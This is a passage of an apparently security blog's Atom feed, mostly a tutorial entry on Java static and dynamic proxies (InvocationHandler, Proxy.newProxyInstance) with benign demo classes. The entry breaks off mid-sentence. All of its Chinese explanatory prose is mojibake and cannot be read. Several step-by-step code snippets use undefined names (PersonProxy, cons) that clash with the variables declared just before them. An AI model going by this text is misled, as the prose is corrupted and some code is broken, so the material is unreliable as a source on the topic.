ä½œç”¨ æ˜¯ä»€ä¹ˆ?ä¸¾ä¸ªä¾‹å­è¯´æ˜</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™é‡Œä¸»è¦è®²è§£Javaåºåˆ—åŒ–åŠååºåˆ—åŒ–æœºåˆ¶ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ä½•ä¸ºåºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#ä½•ä¸ºåºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;ä½•ä¸ºåºåˆ—åŒ–&quot;&gt;&lt;/a&gt;ä½•ä¸ºåºåˆ—åŒ–&lt;/h2&gt;&lt;p&gt;Java æä¾›äº†ä¸€ç§å¯¹è±¡åºåˆ—åŒ–çš„æœºåˆ¶ï¼šä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«è¡¨ç¤ºä¸º
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>JavaåŠ¨æ€ä»£ç†æœºåˆ¶</title>
    <link href="https://Mi1k7ea.github.com/2019/02/01/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    <id>https://Mi1k7ea.github.com/2019/02/01/JavaåŠ¨æ€ä»£ç†æœºåˆ¶/</id>
    <published>2019-02-01T15:01:14.000Z</published>
    <updated>2019-02-08T14:23:10.231Z</updated>
    
    <content type="html"><![CDATA[<p>JavaåŠ¨æ€ä»£ç†æœºåˆ¶ä¸»è¦é€šè¿‡åå°„æœºåˆ¶æ¥å®ç°çš„ï¼Œä¸‹é¢è®²è§£ä¸€ä¸‹åŠ¨æ€ä»£ç†ç›¸å…³å†…å®¹ã€‚</p><h2 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h2><p>ä»£ç†æ¨¡å¼æ˜¯Javaä¸­å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ï¼Œä¸»è¦ç”±å…¬å…±æ¥å£ã€è¢«ä»£ç†ç±»å’Œä»£ç†ç±»ç­‰ä¸‰éƒ¨åˆ†ç»„æˆï¼Œä»£ç†ç±»æŒæœ‰è¢«ä»£ç†ç±»çš„å®ç±»ï¼Œä»£ä¸ºæ‰§è¡Œå…·ä½“çš„ç±»æ–¹æ³•ã€‚å…¶ä¸­ä»£ç†ç±»ä¸è¢«ä»£ç†ç±»æœ‰åŒæ ·çš„æ¥å£ã€‚</p><p>ä»£ç†ç±»ä¸è¢«ä»£ç†ç±»ä¹‹é—´é€šå¸¸ä¼šå­˜åœ¨å…³è”å…³ç³»ï¼Œä¸€ä¸ªä»£ç†ç±»çš„å¯¹è±¡ä¸ä¸€ä¸ªè¢«ä»£ç†ç±»çš„å¯¹è±¡å…³è”ï¼Œä»£ç†ç±»çš„å¯¹è±¡æœ¬èº«å¹¶ä¸çœŸæ­£å®ç°æœåŠ¡ï¼Œè€Œæ˜¯é€šè¿‡è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡çš„æ–¹æ³•æ¥æä¾›ç‰¹å®šçš„æœåŠ¡ã€‚</p><p><strong>ä»£ç†æ¨¡å¼ç»“æ„å›¾</strong></p><p><img src="/2019/02/01/JavaåŠ¨æ€ä»£ç†æœºåˆ¶/1.png" alt="ä»£ç†æ¨¡å¼ç»“æ„å›¾"></p><p><strong>ä½¿ç”¨ä»£ç†æ¨¡å¼çš„åœºæ™¯</strong></p><p>(1)ã€è®¾è®¡æ¨¡å¼ä¸­æœ‰ä¸€ä¸ªè®¾è®¡åŸåˆ™æ˜¯å¼€é—­åŸåˆ™ï¼ŒæŒ‡ä¿®æ”¹å…³é—­å¯¹æ‰©å±•å¼€æ”¾ï¼Œå½“éœ€è¦çœ‹éæœ¬äººæ‰€å†™çš„ä»£ç æ—¶ï¼Œé€šå¸¸å¾ˆéš¾ç›´æ¥ä¿®æ”¹ä»£ç ï¼Œé‚£ä¹ˆè¿™æ—¶å°±å¯ä»¥é€šè¿‡ä»£ç†å¯¹ç±»è¿›è¡Œå¢å¼ºã€‚</p><p>(2)ã€åœ¨ä½¿ç”¨RPCæ¡†æ¶æ—¶ï¼Œæ¡†æ¶æœ¬èº«å¹¶ä¸èƒ½æå‰çŸ¥é“å„ä¸ªä¸šåŠ¡æ–¹è¦è°ƒç”¨å“ªäº›æ¥å£çš„å“ªäº›æ–¹æ³• ã€‚é‚£ä¹ˆè¿™æ—¶å°±å¯é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼æ¥å»ºç«‹ä¸€ä¸ªä¸­é—´äººç»™å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œä¹Ÿæ–¹ä¾¿æ¡†æ¶è¿›è¡Œæ­å»ºé€»è¾‘ï¼ŒæŸç§ç¨‹åº¦ä¸Šä¹Ÿæ˜¯å®¢æˆ·ç«¯ä»£ç å’Œæ¡†æ¶æ¾è€¦åˆçš„ä¸€ç§è¡¨ç°ã€‚</p><p>(3)ã€Springçš„AOPæœºåˆ¶å°±æ˜¯é‡‡ç”¨åŠ¨æ€ä»£ç†çš„æœºåˆ¶æ¥å®ç°åˆ‡é¢ç¼–ç¨‹ã€‚</p><p><strong>é™æ€ä»£ç†ä¸åŠ¨æ€ä»£ç†</strong></p><p>æ ¹æ®åŠ è½½è¢«ä»£ç†ç±»çš„æ—¶æœºä¸åŒï¼Œå°†ä»£ç†åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ã€‚</p><p>å¦‚æœåœ¨ä»£ç ç¼–è¯‘æ—¶å°±ç¡®å®šäº†è¢«ä»£ç†çš„ç±»æ˜¯å“ªä¸€ä¸ªï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ä½¿ç”¨é™æ€ä»£ç†ï¼›å¦‚æœä¸èƒ½ç¡®å®šï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ç±»çš„åŠ¨æ€åŠ è½½æœºåˆ¶ï¼Œåœ¨ä»£ç è¿è¡ŒæœŸé—´åŠ è½½è¢«ä»£ç†çš„ç±»ï¼Œè¿™å°±æ˜¯åŠ¨æ€ä»£ç†ï¼Œæ¯”å¦‚RPCæ¡†æ¶å’ŒSpring AOPæœºåˆ¶ã€‚</p><h2 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h2><p>é™æ€ä»£ç†ï¼šåœ¨ä»£ç ç¼–è¯‘æ—¶å°±ç¡®å®šäº†å…·ä½“çš„è¢«ä»£ç†ç±»ã€‚ç”±ç¨‹åºå‘˜åˆ›å»ºæˆ–ç‰¹å®šå·¥å…·è‡ªåŠ¨ç”Ÿæˆæºä»£ç ï¼Œä¹Ÿå°±æ˜¯åœ¨ç¼–è¯‘æ—¶å°±å·²ç»å°†æ¥å£ã€è¢«ä»£ç†ç±»ã€ä»£ç†ç±»ç­‰ç¡®å®šä¸‹æ¥ã€‚åœ¨ç¨‹åºè¿è¡Œä¹‹å‰ï¼Œä»£ç†ç±»çš„.classæ–‡ä»¶å°±å·²ç»ç”Ÿæˆã€‚</p><p><strong>Demoç¤ºä¾‹</strong></p><p>å…¶ä¸­è¢«ä»£ç†ç±»å·²ç»æ˜ç¡®çš„åœ¨ä»£ç†ç±»ä»£ç ä¸­å†™å‡ºï¼Œåœ¨ä»£ç ç¼–è¯‘æ—¶å°±èƒ½ç¡®å®šå‡ºè¯¥è¢«ä»£ç†ç±»ï¼Œä»è€Œå®ç°é™æ€ä»£ç†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">consumer</span><span class="params">(ProxyInterface pi)</span></span>&#123;</span><br><span class="line">        pi.echo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        consumer(<span class="keyword">new</span> ProxyObject());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ProxyInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealObject</span> <span class="keyword">implements</span> <span class="title">ProxyInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is RealObject."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyObject</span> <span class="keyword">implements</span> <span class="title">ProxyInterface</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"AOP"</span>);</span><br><span class="line">        <span class="keyword">new</span> RealObject().echo();</span><br><span class="line">        System.out.println(<span class="string">"Write Log"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä»£ç†ç±»ProxyObjectåœ¨æ‰§è¡Œè¢«ä»£ç†ç±»RealObjectçš„æ–¹æ³•å‰åéƒ½èƒ½å¤Ÿæ–¹ä¾¿åœ°æ·»åŠ æ–°çš„åŠŸèƒ½å¦‚Springçš„é¢å‘åˆ‡é¢ç¼–ç¨‹AOPï¼Œä¸”æ˜¯é€šè¿‡è°ƒç”¨è¢«ä»£ç†ç±»çš„æ–¹æ³•æ¥å®ç°è°ƒç”¨çš„è€Œéä»£ç†ç±»è‡ªå·±ç›´æ¥è°ƒç”¨çš„ï¼š</p><p><img src="/2019/02/01/JavaåŠ¨æ€ä»£ç†æœºåˆ¶/2.png" alt="é™æ€ä»£ç†"></p><h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>åœ¨ä»£ç ç¼–è¯‘æ—¶æœªç¡®å®šå…·ä½“çš„è¢«ä»£ç†ç±»ï¼Œè€Œåœ¨ä»£ç è¿è¡Œæ—¶åŠ¨æ€åŠ è½½è¢«ä»£ç†çš„ç±»ã€‚åœ¨Javaä¸­java.lang.reflectåŒ…ä¸‹æä¾›äº†ä¸€ä¸ªProxyç±»å’Œä¸€ä¸ªInvocationHandleræ¥å£ï¼Œé€šè¿‡ä½¿ç”¨è¿™ä¸ªç±»å’Œæ¥å£å°±å¯ä»¥ç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡ã€‚åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„è¿™ä¸ªå¯¹è±¡ï¼Œå…¶å®å°±æ˜¯é€šè¿‡åå°„æœºåˆ¶æ¥ç”Ÿæˆçš„ä¸€ä¸ªä»£ç†ã€‚</p><p>æ³¨æ„ï¼ŒJDKæä¾›çš„ä»£ç†åªèƒ½é’ˆå¯¹æ¥å£åšä»£ç†ã€‚</p><p>ä¸‹é¢æ¥çœ‹ä¸‹å®ç°åŠ¨æ€ä»£ç†æœºåˆ¶çš„Proxyç±»å’ŒInvocationHandleræ¥å£ã€‚</p><h3 id="InvocationHandleræ¥å£"><a href="#InvocationHandleræ¥å£" class="headerlink" title="InvocationHandleræ¥å£"></a>InvocationHandleræ¥å£</h3><p>æ¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»éƒ½å¿…é¡»è¦å®ç°InvocationHandlerè¿™ä¸ªæ¥å£ï¼Œå¹¶ä¸”æ¯ä¸ªä»£ç†ç±»çš„å®ä¾‹éƒ½å…³è”åˆ°äº†ä¸€ä¸ªhandlerï¼Œå½“ä»£ç†ç±»å¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨å°±ä¼šè¢«è½¬å‘ä¸ºç”±InvocationHandlerè¿™ä¸ªæ¥å£çš„ invoke ()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>ä½œä¸ºInvocationHandleræ¥å£å”¯ä¸€çš„æ–¹æ³•ï¼Œinvoke ()æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span></span><br></pre></td></tr></table></figure><p>proxyå‚æ•°ï¼šæŒ‡ä»£è¢«ä»£ç†ç±»å¯¹è±¡å³çœŸå®å¯¹è±¡ï¼›</p><p>methodå‚æ•°ï¼šæŒ‡ä»£çš„æ˜¯æ‰€è¦è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡çš„æŸä¸ªæ–¹æ³•çš„Methodå¯¹è±¡ï¼›</p><p>argså‚æ•°ï¼šæŒ‡ä»£çš„æ˜¯è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡æŸä¸ªæ–¹æ³•æ—¶æ¥å—çš„å‚æ•°ï¼›</p><h3 id="Proxyç±»"><a href="#Proxyç±»" class="headerlink" title="Proxyç±»"></a>Proxyç±»</h3><p>Proxyè¿™ä¸ªç±»çš„ä½œç”¨å°±æ˜¯ç”¨æ¥åŠ¨æ€åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ç±»ï¼Œå®ƒæä¾›äº†è®¸å¤šçš„æ–¹æ³•ï¼Œå…¶ä¸­ç”¨çš„æœ€å¤šçš„å°±æ˜¯ newProxyInstance ()æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</span>  <span class="keyword">throws</span> IllegalArgumentException</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯å¾—åˆ°ä¸€ä¸ªåŠ¨æ€çš„ä»£ç†ç±»å¯¹è±¡ï¼Œå…¶ä¸­æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼š</p><p>loaderå‚æ•°ï¼šä¸€ä¸ªClassLoaderå¯¹è±¡ï¼Œå®šä¹‰äº†ç”±å“ªä¸ªClassLoaderå¯¹è±¡æ¥å¯¹ç”Ÿæˆçš„ä»£ç†ç±»å¯¹è±¡è¿›è¡ŒåŠ è½½ï¼›</p><p>interfaceså‚æ•°ï¼šä¸€ä¸ªInterfaceæ¥å£å¯¹è±¡æ•°ç»„ï¼Œè¯´æ˜å°†è¦ç»™è¢«ä»£ç†ç±»å¯¹è±¡æä¾›ä¸€ç»„ä»€ä¹ˆæ ·çš„æ¥å£ï¼Œå¦‚æœæä¾›äº†ä¸€ç»„æ¥å£ç»™è¢«ä»£ç†ç±»å¯¹è±¡ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡å°±å®£ç§°å®ç°äº†è¯¥æ¥å£(å¤šæ€)ï¼Œè¿™æ ·å°±èƒ½è°ƒç”¨è¿™ç»„æ¥å£ä¸­çš„æ–¹æ³•äº†ï¼›</p><p>hå‚æ•°ï¼šä¸€ä¸ªInvocationHandlerå¯¹è±¡ï¼Œè¡¨ç¤ºçš„æ˜¯å½“è¿™ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡åœ¨è°ƒç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå…³è”åˆ°å“ªä¸€ä¸ªInvocationHandlerå¯¹è±¡ä¸Šï¼›</p><h3 id="åˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡çš„å…·ä½“æ­¥éª¤"><a href="#åˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡çš„å…·ä½“æ­¥éª¤" class="headerlink" title="åˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡çš„å…·ä½“æ­¥éª¤"></a>åˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡çš„å…·ä½“æ­¥éª¤</h3><p>1ã€åˆ›å»ºä¸€ä¸ªInvocationHandlerå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªä¸ä»£ç†å¯¹è±¡ç›¸å…³è”çš„InvocationHandler</span></span><br><span class="line">InvocationHandler stuHandler = <span class="keyword">new</span> MyInvocationHandler&lt;Person&gt;(stu);</span><br></pre></td></tr></table></figure><p>2ã€ä½¿ç”¨Proxyç±»çš„getProxyClassé™æ€æ–¹æ³•ç”Ÿæˆä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»stuProxyClass </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; stuProxyClass = Proxy.getProxyClass(Person.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123;Person.class&#125;);</span><br></pre></td></tr></table></figure><p>3ã€è·å¾—stuProxyClass ä¸­ä¸€ä¸ªå¸¦InvocationHandlerå‚æ•°çš„æ„é€ å™¨constructor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = PersonProxy.getConstructor(InvocationHandler.class);</span><br></pre></td></tr></table></figure><p>4ã€é€šè¿‡æ„é€ å™¨constructoræ¥åˆ›å»ºä¸€ä¸ªåŠ¨æ€å®ä¾‹stuProxy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person stuProxy = (Person) cons.newInstance(stuHandler);</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œä¸Šé¢å››ä¸ªæ­¥éª¤å¯ä»¥é€šè¿‡Proxyç±»çš„newProxyInstances()æ–¹æ³•æ¥ç®€åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªä¸ä»£ç†å¯¹è±¡ç›¸å…³è”çš„InvocationHandler</span></span><br><span class="line">InvocationHandler stuHandler = <span class="keyword">new</span> MyInvocationHandler&lt;Person&gt;(stu);</span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡stuProxyï¼Œä»£ç†å¯¹è±¡çš„æ¯ä¸ªæ‰§è¡Œæ–¹æ³•éƒ½ä¼šæ›¿æ¢æ‰§è¡ŒInvocationä¸­çš„invokeæ–¹æ³•</span></span><br><span class="line">Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Person.class&#125;, stuHandler);</span><br></pre></td></tr></table></figure><h3 id="Demoç¤ºä¾‹"><a href="#Demoç¤ºä¾‹" class="headerlink" title="Demoç¤ºä¾‹"></a>Demoç¤ºä¾‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªè¢«ä»£ç†ç±»çš„å¯¹è±¡</span></span><br><span class="line">        Subject realSubject = <span class="keyword">new</span> RealSubject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€šè¿‡å®ç°InvacationHandleræ¥å£ï¼Œå°†è¢«ä»£ç†ç±»å¯¹è±¡ä¼ å…¥handler</span></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> DynamicProxy(realSubject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * é€šè¿‡Proxyçš„newProxyInstanceæ–¹æ³•æ¥åˆ›å»ºä»£ç†ç±»å¯¹è±¡ï¼Œæ¥çœ‹çœ‹å…¶ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment">         * ç¬¬ä¸€ä¸ªå‚æ•° handler.getClass().getClassLoader() ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨handlerè¿™ä¸ªç±»çš„ClassLoaderå¯¹è±¡æ¥åŠ è½½æˆ‘ä»¬çš„ä»£ç†å¯¹è±¡</span></span><br><span class="line"><span class="comment">         * ç¬¬äºŒä¸ªå‚æ•°realSubject.getClass().getInterfaces()ï¼Œæˆ‘ä»¬è¿™é‡Œä¸ºä»£ç†å¯¹è±¡æä¾›çš„æ¥å£æ˜¯çœŸå®å¯¹è±¡æ‰€å®è¡Œçš„æ¥å£ï¼Œè¡¨ç¤ºæˆ‘è¦ä»£ç†çš„æ˜¯è¯¥çœŸå®å¯¹è±¡ï¼Œè¿™æ ·æˆ‘å°±èƒ½è°ƒç”¨è¿™ç»„æ¥å£ä¸­çš„æ–¹æ³•äº†</span></span><br><span class="line"><span class="comment">         * ç¬¬ä¸‰ä¸ªå‚æ•°handlerï¼Œ æˆ‘ä»¬è¿™é‡Œå°†è¿™ä¸ªä»£ç†å¯¹è±¡å…³è”åˆ°äº†ä¸Šæ–¹çš„ InvocationHandler è¿™ä¸ªå¯¹è±¡ä¸Š</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Subject subject = (Subject)Proxy.newProxyInstance(handler.getClass().getClassLoader(), realSubject.getClass().getInterfaces(), handler);</span><br><span class="line">        System.out.println(subject.getClass().getName());</span><br><span class="line">        subject.send();</span><br><span class="line">        subject.recv();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSubject</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Send"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Recv"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">//è¦ä»£ç†çš„è¢«ä»£ç†ç±»å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">private</span> Object subject;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ æ–¹æ³•ï¼Œç»™è¢«ä»£ç†ç±»å¯¹è±¡èµ‹åˆå§‹å€¼</span></span><br><span class="line">    DynamicProxy(Object subject)&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object object, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        <span class="comment">//åœ¨ä»£ç†çœŸå®å¯¹è±¡å‰å¯ä»¥æ·»åŠ ä¸€äº›åŠŸèƒ½æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">"AOP"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Method: "</span> + method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å½“ä»£ç†ç±»å¯¹è±¡è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œå…¶ä¼šè‡ªåŠ¨è·³è½¬åˆ°ä»£ç†ç±»å¯¹è±¡å…³è”çš„handlerå¯¹è±¡çš„invoke()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨</span></span><br><span class="line">        method.invoke(subject, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åœ¨ä»£ç†çœŸå®å¯¹è±¡åä¹Ÿå¯ä»¥æ·»åŠ ä¸€äº›åŠŸèƒ½æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">"Write Logs"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¬¡æé†’ï¼ŒJDKæä¾›çš„ä»£ç†åªèƒ½æ˜¯é’ˆå¯¹æ¥å£åšä»£ç†ï¼Œä¹Ÿå°±æ˜¯è¯´è°ƒç”¨newProxyInstance()è¿”åˆ›å»ºä»£ç†ç±»å¯¹è±¡æ—¶å›çš„å¿…é¡»è¦æ˜¯ä¸€ä¸ªæ¥å£ã€‚</p><p>è§‚å¯Ÿè¾“å‡ºå†…å®¹ï¼š</p><p><img src="/2019/02/01/JavaåŠ¨æ€ä»£ç†æœºåˆ¶/3.png" alt="åŠ¨æ€ä»£ç†"></p><p>ç¬¬ä¸€è¡Œå†…å®¹ï¼šâ€com.sun.proxy.\$Proxy0â€æ˜¯ç”± System.out.println(subject.getClass().getName()); è¿™æ¡è¯­å¥æ‰“å°å‡ºæ¥çš„ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šä»¥ä¸ºè¿”å›çš„è¿™ä¸ªä»£ç†å¯¹è±¡ä¼šæ˜¯Subjectç±»å‹çš„å¯¹è±¡æˆ–è€…æ˜¯InvocationHandlerçš„å¯¹è±¡ï¼Œç„¶å¹¶éï¼ŒåŸå› 